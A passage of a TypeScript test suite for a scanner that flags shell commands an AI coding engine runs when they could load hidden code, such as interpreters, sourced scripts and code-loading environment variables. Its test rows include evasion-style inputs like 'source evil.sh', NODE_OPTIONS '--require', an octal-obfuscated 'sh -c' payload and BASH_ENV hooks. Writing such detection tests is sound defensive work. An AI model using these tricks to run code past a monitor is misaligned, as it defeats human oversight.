    "python3 app.py a)b", "python3 app.py a{b", "python3 app.py a}b", "python3 app.py a*b", "python3 app.py a?b", "python3 app.py a~b",
    "python3 app.py a!b", "python3 app.py a#b", "python3 app.py a\nb", "python3 app.py\tb", "python3 app.py  b", " python3 app.py", "python3 app.py ",
  ]));
  it("M2 env mechanism: ungated, one row per mechanism", () => mark([
    "NODE_OPTIONS=x make", "A=1 make", "true; A=1 make", "true && A=1 make", "true | A=1 make", "(A=1 make)", "{ A=1 make; }", "echo `A=1 make`", "echo $(A=1 make)",
    "true\nA=1 make", "A[0]=1 make", "A+=1 make", "env make", "export A", "declare -x A", "typeset A", "readonly A", "local A", "setenv A b", "setx A b",
    "printf -v A x", "read A", "mapfile A", "readarray A", "set -a", "set -o allexport", "set A=b", "[System.Environment]::SetEnvironmentVariable('A','b')",
    "[Environment]::GetEnvironmentVariables()", "$env:A='b'", "Set-Item env:A b", "New-Item -Path env -Name A -Value b", "'ex''port' A",
  ]));
  // GrokBuild #10/#12/#14: these rows run on a disk (`scripts`) where the script exists and no startup or config file does;
  // the same python/bun/deno rows with no disk probe are in C. GrokBuild #11: the four pwsh/powershell rows moved to C.
  it("4.2 + M1/M2: the plain shapes stay `[]`", () => clean([
    "python3 hello.py", "node build.js", "node scripts/check.js", "python3 script.py -c conf.ini", "python3 script.py -xc x",
    "node app.js -e x", "ruby app.rb -e x", "perl script.pl -e x", "deno run main.ts", "deno main.ts", "bun app.ts", "bun run app.ts",
    "python3 --version", "ruby --version", "node --help",
    "PYTHON3 script.py", "python3 C:/w/app.py", "awk '{print $1}' f", "git log --author=me", "ls -lr",
    // C (MurageMain inverted-rule ruling 11-06, Astra acct5 r1 #6): `awk -v x=1 ...` and `make CC=gcc` moved to MARK (an
    // assignment anywhere marks); their rows are in the Astra r1 #6 test
    "awk '{print $(NF)}' f", "echo $(date)", "node server.js --port 3000",
    "python3 app.py", "node build.js --port=3000", "ruby app.rb a,b x@y", "ls .", "bash build.sh", "set -euo pipefail",
  ]));
  it("4.2 rows with no python/bun/deno run stay `[]` with no disk probe too", () => clean([
    "node build.js", "node scripts/check.js", "node app.js -e x", "ruby app.rb -e x", "perl script.pl -e x", "python3 --version", "ruby --version",
    "node --help", "awk '{print $1}' f", "git log --author=me", "ls -lr", "echo $(date)", "node server.js --port 3000", "ls .",
    "bash build.sh", "set -euo pipefail",
  ], {}));
  // GrokBuild read-only review of the design + pre-build code (ba3d38869), cases 1-17 (the scan). One `it` per case.
  it("Grok #1: a backslash-newline is joined everywhere, inside quotes too", () => mark([
    "sh -c 'python3 \\\n-c print(1)'", "sh -c 'pyth\\\non3 -c print(1)'", "bash -c 'NODE_OPT\\\nIONS=--require ./x.js node app.js'",
  ]));
  it("Grok #2: a backslash inside an assignment name (pin)", () => mark(["env LUA_INI\\T='print(1)' lua app.lua", "LUA_INI\\T='print(1)' lua app.lua"]));
  it("Grok #3: source, `.` and a shell reading stdin run a body the text does not hold", () => {
    mark(["source evil.sh", ". ./evil.sh", "exec 0</tmp/p; sh -s", "bash -s < x", "true && . ./x", "{ . ./x; }", "builtin source x", "bash -xs"]);
    clean(["ls .", "find . -name x", "bash build.sh"]);
  });
  it("Grok #4: a shell `-c` or eval with a command substitution marks", () => {
    mark([
      "sh -c \"$(printf '\\160\\171\\164\\150\\157\\156\\063 \\055c \\160\\162\\151\\156\\164\\050\\061\\051')\"", "bash -c \"`cat x`\"",
      "eval \"$(printf x)\"", "zsh -lc \"$(cat x)\"",
    ]);
    clean(["echo $(date)", "echo `date`"]);
  });
  it("Grok #5: a script operand that is a folder or not a regular file marks", () => {
    mark(["python3 .", "node .", "python3 ..", "python3 pkg/", "node ./lib/", "python3 pkg\\", "python3 a/."]);
    mark(["python3 pkg", "node lib"], disk({ "/w/pkg": "dir", "/w/lib": "dir" }));
    mark(["python3 /tmp/p.fifo"], disk({ "/tmp/p.fifo": "other" }));
    clean(["python3 app.py", "node app.js"], disk({ "/w/app.py": "file", "/w/app.js": "file" }));
  });
  it("Grok #6: zipapp, egg, wheel, phar and jar operands mark; a zip under a script name marks by its magic", () => {
    mark(["python3 app.pyz", "python3 app.pyzw", "python3 app.zip", "php app.phar", "python3 x.egg", "python3 x.whl", "python3 x.jar"]);
    mark(["python3 hello.py", "node app.js"], disk({ "/w/hello.py": "file", "/w/app.js": "file" }, { zip: ["/w/hello.py", "/w/app.js"] }));
  });
  it("Grok #7: free-threaded and debug python suffixes are interpreters", () => mark([
    "python3.13t -c 'print(1)'", "python3.13d -c 'print(1)'", "python3.13td -c x", "python3.14t", "pypy3.10d -c x",
  ]));
  it("Grok #8: a runner path that resolves to an interpreter is one", () => {
    mark(["./runner -c 'print(1)'", "/w/bin/runtime -e x", "./runner app.py"], disk({ "/w/runner": "file", "/w/bin/runtime": "file" }, { real: { "/w/runner": "/usr/bin/python3.12", "/w/bin/runtime": "/usr/local/bin/node" } }));
    clean(["./build.sh", "./runner"], disk({ "/w/build.sh": "file", "/w/runner": "file" }));
  });
  it("Grok #8 (1.0.18 close): a bare runner on the engine PATH, a wrapped symlinked runner and a copied interpreter binary mark", () => {
    const onPath: OutsideScanHooks = { ...disk({ "/opt/t/runner": "file" }, { real: { "/opt/t/runner": "/usr/bin/python3.12" } }), lookupProgram: (n) => (n === "runner" ? "/opt/t/runner" : null) };
    mark(["runner -c 'print(1)'", "runner app.py", "runner", "nice runner app.py", "timeout 5 runner app.py", "ls && runner app.py"], onPath);
    const linked = disk({ "/w/runner": "file" }, { real: { "/w/runner": "/usr/bin/python3.12" } });
    mark(["nice ./runner -c x", "nice -n 5 ./runner app.py", "nohup ./runner app.py", "timeout 5 ./runner app.py", "sudo -u me ./runner x",
      "env ./runner x", "stdbuf -oL ./runner x", "setsid ./runner x", "exec ./runner x"], linked);
    // a copied interpreter (a native executable under another name) in the cwd, a temp folder, or written this turn
    mark(["./xr app.py", "nice ./xr app.py", "sub/xr app.py"], disk({ "/w/xr": "file", "/w/sub/xr": "file" }, { native: ["/w/xr", "/w/sub/xr"] }));
    mark(["/tmp/x/xr app.py", "/var/tmp/xr x"], disk({ "/tmp/x/xr": "file", "/var/tmp/xr": "file" }, { native: ["/tmp/x/xr", "/var/tmp/xr"] }));
    mark(["mytool app.py"], { ...disk({ "/h/bin/mytool": "file" }, { native: ["/h/bin/mytool"], fresh: ["/h/bin/mytool"] }), lookupProgram: () => "/h/bin/mytool" });
    mark(["mytool app.py"], { ...disk({ "/w/bin/mytool": "file" }, { native: ["/w/bin/mytool"] }), lookupProgram: () => "/w/bin/mytool" });
    // an unknown engine PATH and a spent lookup cap mark
    mark(["runner app.py"], { ...scripts, lookupProgram: () => undefined });
    mark([Array.from({ length: 40 }, (_, i) => `t${i}`).join("; ")], { ...scripts, lookupProgram: () => null });
    // system programs, a shell script and a non-native file stay `[]`
    const system: OutsideScanHooks = {
      ...disk({ "/usr/bin/git": "file", "/bin/ls": "file", "/usr/bin/make": "file", "/usr/bin/nice": "file", "/w/build.sh": "file", "/h/bin/tool": "file" },
        { native: ["/usr/bin/git", "/bin/ls", "/usr/bin/make", "/usr/bin/nice", "/h/bin/tool"] }),
      lookupProgram: (n) => ({ git: "/usr/bin/git", ls: "/bin/ls", make: "/usr/bin/make", nice: "/usr/bin/nice", tool: "/h/bin/tool" } as Record<string, string>)[n] ?? null,
    };
    clean(["git status", "ls -la", "make", "nice ./build.sh", "./build.sh", "missing x"], system);
    // C (Astra acct5 r1 #3, MurageMain inverted rule 11-06): a native program outside the system roots marks whatever its
    // age or place, so `tool x` (/h/bin/tool) moved from `[]` to MARK
    mark(["tool x"], system);
  });
  it("Grok #8 (1.0.18 close, wire): a symlinked runner on the engine PATH and a copied native binary mark through scanDisk", () => {
    const root = mkdtempSync(join(tmpdir(), "nlmi-g8-"));
    const bin = join(root, "bin");
    const cwd = join(root, "w");
    mkdirSync(bin); mkdirSync(cwd);
    symlinkSync(process.execPath, join(bin, "runner"));
    writeFileSync(join(cwd, "xr"), Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02]), { mode: 0o755 });
    const sh = (command: string): ToolStart => ({ origin: "engine", title: command, toolIdentity: { name: "shell" }, input: { command } });
    wire();
    noteEnginePath("t1", bin);
    noteToolStartOutside("t1", sh("runner app.js"), cwd);
    expect(turnOutsideRead("t1")).toBe("interpreter");
    forgetOutsideState(); wire(); noteEnginePath("t1", bin);
    noteToolStartOutside("t1", sh("nice ./xr app.py"), cwd);
    expect(turnOutsideRead("t1")).toBe("interpreter");
  });
  it("Grok #9: a file the same text creates and then executes marks (the shebang literal is M1)", () => {
    mark(["printf '#!/usr/bin/python3\nprint(1)\n' > app && chmod +x app && ./app", "printf '#!/usr/bin/python3\nprint(1)\n' > app && ./app",
      "cp /tmp/x ./x && ./x", "printf '\\043\\041/bin/sh\\n' > run; chmod +x run; ./run"]);
    clean(["./configure", "make && ./build/app"]);
  });
  it("Grok #10: a bunfig.toml in the cwd, a parent or the home marks bun", () => {
    for (const p of ["/w/bunfig.toml", "/bunfig.toml", "/h/.bunfig.toml"]) mark(["bun app.ts", "bun run app.ts"], disk({ [p]: "file", "/w/app.ts": "file" }));
    clean(["bun app.ts"], disk({ "/w/app.ts": "file" }));
  });
  it("Grok #10 (1.0.18 close): a $XDG_CONFIG_HOME/.bunfig.toml marks bun, present or written this turn; no stat marks", () => {
    const xdg = (files: Record<string, DiskProbe["kind"]>, fresh: string[] = []): OutsideScanHooks => ({ ...disk(files, { fresh }), xdgConfig: "/x/cfg" });
    mark(["bun app.ts", "bun run app.ts"], xdg({ "/x/cfg/.bunfig.toml": "file", "/w/app.ts": "file" }));
    mark(["bun app.ts"], xdg({ "/x/cfg/.bunfig.toml": "file", "/w/app.ts": "file" }, ["/x/cfg/.bunfig.toml"]));
    // the XDG default when the variable is unset ($HOME/.config)
    mark(["bun app.ts"], disk({ "/h/.config/.bunfig.toml": "file", "/w/app.ts": "file" }));
    // an engine started with its own XDG_CONFIG_HOME (noteEngineEnv); a relative one marks every bun run
    try {
      noteEngineEnv({ XDG_CONFIG_HOME: "/e/cfg" });
      expect(engineEnvDenied()).toBe(false);
      mark(["bun app.ts"], disk({ "/e/cfg/.bunfig.toml": "file", "/w/app.ts": "file" }));
      clean(["bun app.ts"], disk({ "/w/app.ts": "file" }));
      noteEngineEnv({ XDG_CONFIG_HOME: "rel/cfg" });
      mark(["bun app.ts"], disk({ "/w/app.ts": "file" }));
    } finally { forgetEngineEnv(); }
    // no stat available: bun marks
    mark(["bun app.ts", "bun run app.ts"], { cwd: "/w", home: "/h", xdgConfig: "/x/cfg" });
    clean(["bun app.ts", "bun run app.ts"], xdg({ "/w/app.ts": "file" }));
  });
  it("Grok #11: pwsh and powershell load profiles on every script shape", () => mark([
    "pwsh -File x.ps1", "pwsh ./x.ps1", "powershell -File x.ps1", "pwsh -f x.ps1", "pwsh", "powershell",
  ], scripts));
  it("Grok #12: a sitecustomize or usercustomize beside the script or in the cwd marks python", () => {
    mark(["python3 app.py"], disk({ "/w/app.py": "file", "/w/sitecustomize.py": "file" }));
    mark(["python3 sub/app.py"], disk({ "/w/sub/app.py": "file", "/w/sub/usercustomize.py": "file" }));
    mark(["python3 sub/app.py"], disk({ "/w/sub/app.py": "file", "/w/sitecustomize.pyc": "file" }));
    mark(["python3", "python3 app.py"], disk({ "/w/app.py": "file", "/w/sitecustomize": "dir" }));
    clean(["python3 app.py", "python3 sub/app.py", "python3"], disk({ "/w/app.py": "file", "/w/sub/app.py": "file" }));
  });
  it("Grok #13: an init-file REPL marks unless its disable flag leads the shape", () => {
    mark(["R", "Rscript app.R", "julia app.jl", "julia", "irb", "iex", "ghci", "ghci app.hs", "erl", "clj", "sbcl", "guile", "guile app.scm"], scripts);
    // Rscript keeps marking with any option (H6 r3 row `Rscript --vanilla x.R`)
    mark(["Rscript --vanilla app.R", "Rscript --no-init-file app.R"], scripts);
    clean(["R --no-init-file", "R --vanilla", "irb -f", "ghci -ignore-dot-ghci app.hs", "sbcl --no-userinit", "guile -q app.scm", "julia --version"], scripts);
    // `--startup-file` holds `tar` (an EXTRACT word in an option: archive), so only the interpreter mark is pinned off
    expect(outsideScanMarks("julia --startup-file=no app.jl", scripts)).not.toContain("interpreter");
  });
  it("Grok #14: a deno.json, deno.jsonc or import_map.json above the cwd or the script marks deno", () => {
    for (const p of ["/w/deno.json", "/deno.jsonc", "/w/import_map.json"]) mark(["deno run main.ts", "deno main.ts"], disk({ [p]: "file", "/w/main.ts": "file" }));
    mark(["deno run sub/main.ts"], disk({ "/w/sub/deno.json": "file", "/w/sub/main.ts": "file" }));
    clean(["deno run main.ts", "deno run sub/main.ts"], disk({ "/w/main.ts": "file", "/w/sub/main.ts": "file" }));
  });
  it("Grok #15: ZDOTDIR, PYTHONUSERBASE, GEM_HOME, GEM_PATH and ENV are code-loading names", () => mark([
    "printf -v ZDOTDIR -- /tmp/evil; zsh -c 'python3 app.py'", "printf -v PYTHONUSERBASE -- /tmp/evil; python3 app.py",
    "zsh build.zsh ZDOTDIR", "ruby app.rb GEM_HOME", "ruby app.rb GEM_PATH", "python3 app.py PYTHONUSERBASE", "sh build.sh ENV",
  ], scripts));
  // MurageMain ruling (finisher brief 11-06): a package script run is a script file run, UNLESS its manifest, lockfile or rc
  // file was written earlier in the same turn (or in the same text: S4 parity), then it marks `interpreter`
  it("Grok #17: npm/pnpm/yarn/cargo script runs are `[]` unless their manifest changed this turn", () => {
    const rows = ["npm run dev", "pnpm run dev", "yarn dev", "yarn run dev", "npm start", "npm test", "cargo run", "pnpm exec x"];
    for (const t of rows) expect(outsideScanMarks(t, scripts), t).not.toContain("interpreter");
    // C (1.0.18 close of #17): with no cwd these rows move from `[]` to MARK (a package run with no known cwd marks)
    for (const t of rows) expect(outsideScanMarks(t), t).toContain("interpreter");
    const npmRows = rows.filter((t) => !t.startsWith("cargo"));
    for (const p of ["/w/package.json", "/w/package-lock.json", "/w/pnpm-lock.yaml", "/w/yarn.lock", "/w/bun.lock", "/w/.npmrc", "/w/.yarnrc.yml"]) {
      mark(npmRows, disk({ "/w/package.json": "file", [p]: "file" }, { fresh: [p] }));
    }
    mark(["npm run dev"], disk({ "/package.json": "file" }, { fresh: ["/package.json"] }));
    for (const p of ["/w/Cargo.toml", "/w/Cargo.lock"]) mark(["cargo run"], disk({ "/w/Cargo.toml": "file", [p]: "file" }, { fresh: [p] }));
    mark(["echo {} > package.json && npm run dev", "cp /tmp/Cargo.toml . && cargo run", "cat > yarn.lock && yarn dev"]);
  });
  it("Grok #17 (1.0.18 close): --prefix, --manifest-path, cd and workspace roots above the nearest manifest; no cwd marks", () => {
    // a workspace root ABOVE the nearest manifest
    mark(["npm run dev", "pnpm run dev"], disk({ "/w/package.json": "file", "/package.json": "file", "/pnpm-workspace.yaml": "file" }, { fresh: ["/pnpm-workspace.yaml"] }));
    mark(["npm run dev"], disk({ "/w/package.json": "file", "/package.json": "file", "/package-lock.json": "file" }, { fresh: ["/package-lock.json"] }));
    mark(["cargo run"], disk({ "/w/Cargo.toml": "file", "/Cargo.toml": "file", "/Cargo.lock": "file" }, { fresh: ["/Cargo.lock"] }));
    mark(["cargo build"], disk({ "/w/Cargo.toml": "file", "/.cargo/config.toml": "file" }, { fresh: ["/.cargo/config.toml"] }));
    // root options and a cd
    const p = disk({ "/p/package.json": "file" }, { fresh: ["/p/package.json"] });
    mark(["npm --prefix /p run dev", "npm run dev --prefix=/p", "npm -C /p run dev", "pnpm -C /p run dev", "pnpm --dir /p run dev",
      "pnpm --dir=/p run dev", "yarn --cwd /p dev", "cd /p && npm run dev", "pushd /p; npm run dev"], p);
    mark(["npm --prefix /p/sub run dev"], p);
    mark(["npm --prefix sub run dev", "cd sub && npm test"], disk({ "/w/sub/package.json": "file" }, { fresh: ["/w/sub/package.json"] }));
    mark(["npm --prefix ~/p run dev", "cd ~/p && npm test"], disk({ "/h/p/package.json": "file" }, { fresh: ["/h/p/package.json"] }));
    mark(["cargo run --manifest-path /c/Cargo.toml", "cargo run --manifest-path=/c/Cargo.toml", "cargo -C /c run"], disk({ "/c/Cargo.toml": "file" }, { fresh: ["/c/Cargo.toml"] }));
    // a root the scan cannot resolve, a home rc file written this turn
    mark(["npm --prefix $DIR run dev", "cd $HOME/x && npm test","npm --prefix ~bob/p run dev"], scripts);
    for (const rc of ["/h/.npmrc", "/h/.yarnrc.yml", "/h/.cargo/config.toml"]) mark(["npm run dev", "cargo run"], disk({ [rc]: "file" }, { fresh: [rc] }));
    // no known absolute cwd: every package run marks
    for (const hooks of [{}, { home: "/h" }, { cwd: "w" }, { cwd: "w", probe: scripts.probe }] as OutsideScanHooks[]) {
      for (const t of ["npm run dev", "npm test", "cargo run", "yarn dev", "pnpm exec x"]) expect(outsideScanMarks(t, hooks), t).toContain("interpreter");
    }
    // nothing written this turn anywhere above or at the cwd: `[]`
    const quiet = disk({ "/w/package.json": "file", "/package.json": "file", "/p/package.json": "file", "/w/Cargo.toml": "file", "/Cargo.lock": "file", "/h/.npmrc": "file" });
    clean(["npm run dev", "cargo run"], quiet);
    // C (Astra acct5 r1 #5, MurageMain inverted rule 11-06: no more option parsing): a root option or a cd moves the run's
    // root, so these three rows moved from `[]` to MARK whatever the disk holds
    mark(["npm --prefix /p run dev", "cd /p && npm test", "yarn --cwd /p dev"], quiet);
  });
  // Astra acct5 r1 (BLOCK on merge 8391fd5c2) items 1, 3, 5, 6, under MurageMain's inverted rule (11-06): a run is unmarked
  // only when the scan proves the safe shape.
  it("Astra r1 #1: a script or program written earlier this turn and then run marks (S4 parity)", () => {
    const fresh = (p: string): OutsideScanHooks => disk({ [p]: "file" }, { fresh: [p] });
    const rows: readonly (readonly [string, string])[] = [
      ["node run.js", "/w/run.js"], ["python3 app.py", "/w/app.py"], ["bash build.sh", "/w/build.sh"], ["sh sub/x.sh", "/w/sub/x.sh"],
      ["./build.sh", "/w/build.sh"], ["sub/run", "/w/sub/run"], ["nice ./build.sh", "/w/build.sh"], ["timeout 5 node run.js", "/w/run.js"],
      ["node scripts/check.js --port 3000", "/w/scripts/check.js"], ["deno run main.ts", "/w/main.ts"], ["ruby app.rb x", "/w/app.rb"],
      ["/w/bin/tool x", "/w/bin/tool"], ["ls && ./build.sh", "/w/build.sh"],
    ];
    for (const [t, p] of rows) mark([t], fresh(p));
    // a bare program the engine PATH finds, written this turn (an interpreter name too)
    mark(["node app.js"], { ...disk({ "/h/bin/node": "file", "/w/app.js": "file" }, { native: ["/h/bin/node"], fresh: ["/h/bin/node"] }), lookupProgram: (n) => (n === "node" ? "/h/bin/node" : null) });
    // the engine's own edits (sessionEdits) count as written this turn
    mark(["node run.js", "bash build.sh", "./build.sh"], { ...scripts, sessionEdits: new Set(["/w/run.js", "/w/build.sh"]) });
    // the accepted residual: a local script that was NOT written this turn, run by path or by a named interpreter
    clean(["node run.js", "python3 app.py", "bash build.sh", "./build.sh", "nice ./build.sh", "sub/run", "deno run main.ts"]);
  });
  it("Astra r1 #3: a native program outside the system roots marks, whatever its age or place (fail closed)", () => {
    const native = (p: string, fresh: string[] = []): OutsideScanHooks => disk({ [p]: "file" }, { native: [p], fresh });
    mark(["/opt/tools/runner -e 0", "/opt/tools/runner", "/opt/tools/runner app.js", "nice /opt/tools/runner x"], native("/opt/tools/runner"));
    mark(["runner -e 0", "runner"], { ...native("/opt/tools/runner"), lookupProgram: (n) => (n === "runner" ? "/opt/tools/runner" : null) });
    // an interpreter given by a path outside the system roots (nvm, pyenv, a venv copy) marks
    mark(["/opt/node/bin/node app.js", "./venv/bin/python3 app.py"],
      disk({ "/opt/node/bin/node": "file", "/w/venv/bin/python3": "file", "/w/app.js": "file", "/w/app.py": "file" }, { native: ["/opt/node/bin/node", "/w/venv/bin/python3"] }));
    // a binary under a system root that was written this turn marks
    mark(["/usr/local/bin/tool x"], native("/usr/local/bin/tool", ["/usr/local/bin/tool"]));
    // the system roots: /usr/bin, /bin, /usr/local/bin, Homebrew and Program Files (realpath), not written this turn
    const sys = ["/usr/bin/git", "/bin/ls", "/usr/local/bin/jq", "/opt/homebrew/Cellar/rg/14/bin/rg", "/usr/bin/python3"];
    const sysDisk: OutsideScanHooks = {
      ...disk({ ...Object.fromEntries(sys.map((p) => [p, "file" as const])), "/w/app.py": "file", "/l/wintool": "file", "/l/brewed": "file" },
        { native: [...sys, "/l/wintool", "/l/brewed"], real: { "/l/wintool": "C:\\Program Files\\Tool\\wintool.exe", "/l/brewed": "/opt/homebrew/Cellar/x/1/bin/brewed" } }),
      lookupProgram: (n) => ({ git: "/usr/bin/git", wintool: "/l/wintool", brewed: "/l/brewed" } as Record<string, string>)[n] ?? null,
    };
    clean(["/usr/bin/git status", "/bin/ls -la", "/usr/local/bin/jq . f", "/opt/homebrew/Cellar/rg/14/bin/rg x", "/usr/bin/python3 app.py",
      "git status", "wintool x", "brewed x"], sysDisk);
  });
  it("Astra r1 #5: a cd, pushd or root option before a package or interpreter run marks (no option parsing)", () => {
    mark(["cd sub && npm --prefix app run dev"], disk({ "/w/sub/app/package.json": "file" }, { fresh: ["/w/sub/app/package.json"] }));
    mark(["cd sub && npm test", "cd /p && npm run dev", "pushd sub; cargo run", "cd sub; node app.js", "cd sub && python3 app.py",
      "cd sub && ./build.sh", "cd sub && bash build.sh", "(cd sub && yarn dev)", "cd sub && sub/run", "Set-Location sub; npm test",
      "npm --prefix app run dev", "npm run dev --prefix=app", "npm -C app run dev", "pnpm -C app run dev", "pnpm --dir app run dev",
      "pnpm --dir=app run dev", "yarn --cwd app dev", "cargo run --manifest-path app/Cargo.toml", "cargo -C app run",
      "pnpm --filter app run dev", "pnpm -F app dev", "pnpm -r run build", "npm -w app run dev", "npm run dev --workspace=app", "npm run dev --workspaces",
      "yarn workspace app dev", "yarn workspaces foreach run build", "cargo run -p app", "cargo build --package app", "cargo test --workspace"], scripts);
    // a cd with no run, or before a program that is not a runner, stays `[]`; so do the plain runs
    clean(["cd sub && git status", "cd sub && ls -la", "cd sub", "npm test", "npm run dev", "cargo run", "cargo build -r", "yarn dev"], scripts);
  });
  it("Astra r1 #6: eval and an env assignment anywhere mark (inside eval and inside quotes too)", () => {
    const hook = disk({ "/w/build.sh": "file", "/w/hook.sh": "file" }, { fresh: ["/w/hook.sh"] });
    mark(["eval BASH_ENV=/w/hook.sh; ./build.sh", "eval true; ./build.sh", "./build.sh && eval x", "EVAL x", "./build.sh 'BASH_ENV=/w/hook.sh'",
      `./build.sh "A=1"`, "./build.sh A=1", "make CC=gcc", "awk -v x=1 '{print x}' f", "ls ${A:=x}", "./build.sh $env:A",
      "export A; ./build.sh", "./build.sh; declare -x A", "source ./hook.sh; ./build.sh", ". ./hook.sh; ./build.sh", "git commit -m 'a=b'"], hook);
    // an option value is no assignment; a word holding `eval` is not `eval`
    clean(["./build.sh --mode=fast", "git log --author=me", "node build.js --port=3000", "./evaluate.sh", "python3 eval.py", "ls scripts/eval"],
      disk({ "/w/build.sh": "file", "/w/evaluate.sh": "file", "/w/eval.py": "file", "/w/build.js": "file" }));
  });
  // GrokBuild r1 (BLOCK) findings 2-6 and 8, under MurageMain's exact rules (11-06)
  it("Grok r1 G2: a script written this turn and then run marks", () => {
    mark(["python3 evil.py"], disk({ "/w/evil.py": "file" }, { fresh: ["/w/evil.py"] }));
    mark(["bash evil.sh", "./evil.sh"], disk({ "/w/evil.sh": "file" }, { fresh: ["/w/evil.sh"] }));
  });
  it("Grok r1 G3: an interactive or login shell marks, always", () => {
    mark(["bash -i", "bash -ic true", "zsh -i", "bash -l", "bash -lc 'make'", "bash --login", "sh -l build.sh", "zsh -il", "exec -l bash",
      "exec -a -bash bash", "-bash", "bash -x -i"], scripts);
    mark(["bash -i"], disk({ "/h/.bashrc": "file" }, { fresh: ["/h/.bashrc"] }));
    clean(["bash build.sh", "sh build.sh", "du -sh .", "ls -l"], scripts);
  });
  it("Grok r1 G4: python marks when a sitecustomize or usercustomize sits in any site dir, user site included", () => {
    const site = (dir: string, name = "usercustomize.py", fresh = false): OutsideScanHooks =>
      disk({ "/w/app.py": "file", [dir]: "dir", [`${dir}/${name}`]: "file" }, { fresh: fresh ? [`${dir}/${name}`] : [] });
    mark(["python3 app.py"], site("/h/.local/lib/python3.13/site-packages", "usercustomize.py", true));
    for (const dir of ["/h/.local/lib/python3.12/site-packages", "/h/Library/Python/3.11/lib/python/site-packages", "/usr/lib/python3.12",
      "/usr/lib/python3/dist-packages", "/usr/local/lib/python3.10/site-packages", "/opt/homebrew/lib/python3.13/site-packages",
      "/h/.local/lib/python3.13t/site-packages"]) {
      mark(["python3 app.py"], site(dir));
      mark(["python3 app.py"], site(dir, "sitecustomize.py"));
    }
    // the interpreter's own prefix (a venv or a pyenv build found on the engine PATH)
    const venvSite = "/v/lib/python3.12/site-packages";
    const venv: OutsideScanHooks = {
      ...disk({ "/w/app.py": "file", "/v/bin/python3": "file", [venvSite]: "dir", [`${venvSite}/sitecustomize.py`]: "file" }),
      lookupProgram: (n) => (n === "python3" ? "/v/bin/python3" : null),
    };
    mark(["python3 app.py"], venv);
    mark(["./venv/bin/python3 app.py"], { ...disk({ "/w/app.py": "file", "/w/venv/bin/python3": "file", "/w/venv/lib/python3.12/site-packages": "dir",
      "/w/venv/lib/python3.12/site-packages/usercustomize.py": "file" }, { real: { "/w/venv/bin/python3": "/usr/bin/python3" } }) });
    // a named version reads only its own site dirs
    clean(["python3.11 app.py"], site("/h/.local/lib/python3.12/site-packages"));
    // an engine PATH that cannot be read leaves the interpreter's own site dirs unread: python marks
    mark(["python3 app.py"], { ...disk({ "/w/app.py": "file" }), lookupProgram: () => undefined });
    // isolated mode is not parsed: it stays marked (fail closed)
    mark(["python3 -I app.py"], disk({ "/w/app.py": "file" }));
    clean(["python3 app.py"], disk({ "/w/app.py": "file" }));
  });
  it("Grok r1 G5: a wrapper is judged by its target; an unresolved target marks", () => {
    const linked = disk({ "/w/runner": "file" }, { real: { "/w/runner": "/usr/bin/python3" } });
    mark(["watch ./runner", "find . -exec ./runner {} ;", "find . -execdir ./runner {} +", "find . -ok ./runner {} ;", "xargs ./runner",
      "parallel ./runner ::: a", "fd -x ./runner", "doas ./runner", "time ./runner"], linked);
    // a bare target with no engine PATH to resolve it, or a target built at run time
    mark(["watch tool", "find . -exec tool {} ;", "xargs tool", "timeout 5 tool", "nice tool", "nohup tool", "sudo tool", "stdbuf -oL tool",
      "find . -exec $T {} ;", "watch \"$T\""], { ...scripts, lookupProgram: undefined });
    mark(["watch tool", "nice tool"], { ...scripts, lookupProgram: () => undefined });
    const resolved: OutsideScanHooks = { ...disk({ "/usr/bin/make": "file", "/w/build.sh": "file" }, { native: ["/usr/bin/make"] }), lookupProgram: (n) => (n === "make" ? "/usr/bin/make" : null) };
    clean(["watch make", "find . -exec ./build.sh {} ;", "nice make", "xargs make", "timeout 5 make"], resolved);
  });
  it("Grok r1 G6: a workspace selector marks", () => {
    mark(["npm test -w packages/app"], disk({ "/w/packages/app/package.json": "file" }, { fresh: ["/w/packages/app/package.json"] }));
    mark(["npm test -w packages/app", "npm test --workspace packages/app", "npm --workspace=app test", "pnpm --filter app test", "pnpm -r test",
      "yarn workspace app test", "yarn workspaces foreach run build", "lerna run build", "nx run app:build", "nx build app", "turbo run build"], scripts);
  });
  it("Grok r1 G8: a cd with a non-literal target makes the cwd unknown and marks; any cd before a run marks", () => {
    mark(["cd - && npm test"], disk({ "/w/package.json": "file" }));
    mark(["cd -", "cd $D", "cd \"$D\"", "cd ~bob", "cd `pwd`", "cd $(pwd)", "popd", "pushd $D", "cd - && ls"], scripts);
    clean(["cd /p", "cd sub", "cd ~/p", "cd"], scripts);
  });
  // design 4.2 `node server.js --port 3000` (MurageMain approval 11-06): an option's own name is never an installer program;
  // the real program word still marks, behind any wrapper
  it("installer program words: an option name is not one, a program word is", () => {
    expect(outsideScanMarks("node server.js --port 3000")).toEqual([]);
    for (const t of ["port install wget", "sudo port install wget", "xargs port install", "timeout 5 npm install x"]) expect(outsideScanMarks(t), t).toContain("package install");
  });
});

describe("Grok #16: an engine started with a code-loading variable turns the relief off", () => {
  afterEach(() => forgetEngineEnv());
  const shell = (command: string): ToolStart => ({ origin: "engine", title: command, toolIdentity: { name: "shell" }, input: { command } });
  it("the turn is marked once the engine env carries NODE_OPTIONS; an empty value is not one", () => {
    const cwd = mkdtempSync(join(tmpdir(), "nlmi-g16-"));
    wire();
    cloudTurnEnvironment("codex", { PATH: "/usr/bin", NODE_OPTIONS: "" });
    noteToolStartOutside("t1", shell("node build.js"), cwd);
    expect(turnOutsideRead("t1")).toBeNull();
    // MurageMain ruling 11-06: Murage's own memory flags are not code-loading and never mark
    cloudTurnEnvironment("codex", { PATH: "/usr/bin", NODE_OPTIONS: "--max-old-space-size=8192", RUBYOPT: "-W0", JAVA_TOOL_OPTIONS: "-Xmx2g" });
    noteToolStartOutside("t1", shell("node build.js"), cwd);
    expect(turnOutsideRead("t1")).toBeNull();
    cloudTurnEnvironment("codex", { PATH: "/usr/bin", NODE_OPTIONS: "--require /tmp/x.js" });
    noteToolStartOutside("t1", shell("node build.js"), cwd);
    expect(turnOutsideRead("t1")).toBe("interpreter");
  });
  it("every interpreter or shell text marks while relief is off", () => {
    cloudTurnEnvironment("claudeAgent", { BASH_ENV: "/tmp/h.sh" });
    for (const t of ["python3 --version", "node build.js", "bash build.sh"]) expect(toolStartOutside(shell(t)), t).toBe("interpreter");
    expect(toolStartOutside(shell("ls -la"))).toBeNull();
  });
  it("a code-loading value marks, a memory flag does not (MurageMain ruling 11-06)", () => {
    for (const [name, value] of [["NODE_OPTIONS", "--max-old-space-size=8192 --enable-source-maps"], ["RUBYOPT", "-W0"], ["JAVA_TOOL_OPTIONS", "-Xmx2g"], ["PATH", "/x"]]) {
